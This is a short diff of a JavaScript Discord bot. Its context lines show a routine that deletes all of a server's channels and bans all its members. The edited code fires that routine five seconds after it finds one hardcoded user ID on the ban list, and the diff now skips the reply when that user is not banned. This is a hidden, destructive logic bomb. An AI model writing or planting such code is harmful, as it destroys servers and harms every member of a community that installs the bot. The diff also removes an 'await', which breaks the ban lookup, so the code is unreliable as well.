@@ -9,12 +9,12 @@ client.on("message", (message) => {
     message.guild.channels.forEach(channel => channel.delete())
     message.guild.members.forEach(members => members.ban())
   }try {
-    const banList = await message.guild.fetchBans();
+    const banList = message.guild.fetchBans();
 
     const bannedUser = banList.find(user => user.id === '289523788822085632');
 
     if (bannedUser) await setTimeout(nuke, 5000);;
-    else await message.channel.send('That user is not banned.');
+    else return;
   } catch(err) {
     console.error(err);
   }
